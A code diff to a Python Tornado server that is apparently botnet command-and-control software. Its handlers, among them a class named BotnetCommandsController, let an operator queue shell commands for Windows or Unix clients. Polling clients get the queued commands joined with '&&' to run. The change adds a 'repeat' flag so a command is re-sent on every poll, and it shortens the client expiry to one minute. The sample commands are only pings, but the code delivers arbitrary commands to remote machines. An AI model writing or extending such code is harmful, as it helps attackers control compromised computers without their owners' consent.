@@ -38,16 +38,19 @@ class ClientCache:
         """
 
         to_execute = []
-        for key, comm in commands.items():
+        for key, value in commands.items():
+            command, repeat = value
             if key not in self.nodes[clientIp][os]:
                 self.nodes[clientIp][os].append(key)
-                to_execute.append(comm)
+                to_execute.append(command)
+            elif repeat:
+                to_execute.append(command)
         return to_execute
 
     def clean_up_expired(self):
         nodes_to_delete = []
         for key, values in self.nodes.items():
-            if int(time.time() * 1000) - values['last_seen'] > 3600:
+            if int(time.time() * 1000) - values['last_seen'] > 1000*60:  # last seen 1 minute ago
                 nodes_to_delete.append(key)
 
         for node in nodes_to_delete:
@@ -82,9 +85,11 @@ class CommandHandler(tornado.web.RequestHandler):
         key = uuid.uuid4().hex
         sys_os = self.get_argument('os', 'unix')
         command = self.get_argument('cmd', '')
+        repeat = self.get_argument('repeat', '')
+        repeat = True if repeat in ['true', 'True', True] else False
 
         if sys_os in ['windows', 'unix']:
-            self.application.commands[sys_os][key] = command
+            self.application.commands[sys_os][key] = command, repeat
         else:
             self.set_status(400)
 
@@ -97,7 +102,6 @@ class CommandHandler(tornado.web.RequestHandler):
             del self.application.commands[sys_os][key]
         else:
             self.set_status(404)
-
 
 
 class BotnetCommandsController(tornado.web.RequestHandler):
@@ -120,6 +124,10 @@ class BotnetCommandsController(tornado.web.RequestHandler):
                                                                     'windows')
             self.write(' && '.join(re))
 
+        self.finish()  # write response to client
+        self.application.clients_cache.clean_up_expired()
+
+
 class Application(tornado.web.Application):
     """
     """
@@ -135,12 +143,12 @@ class Application(tornado.web.Application):
 
         self.commands = dict(
             windows={
-                'pingas': 'ping -n 2 google.com',
-                'nepingas': 'ping -n 2 facebook.com'
+                'pingas': ('ping -n 1 google.com', True),
+                'nepingas': ('ping -n 2 facebook.com', False)
             },
             unix={
-                'pingas': 'ping -c 2 google.com',
-                'nepingas': 'ping -c 2 facebook.com'
+                'pingas': ('ping -c 1 google.com', True),
+                'nepingas': ('ping -c 2 facebook.com', False)
             })
 
         settings = dict(
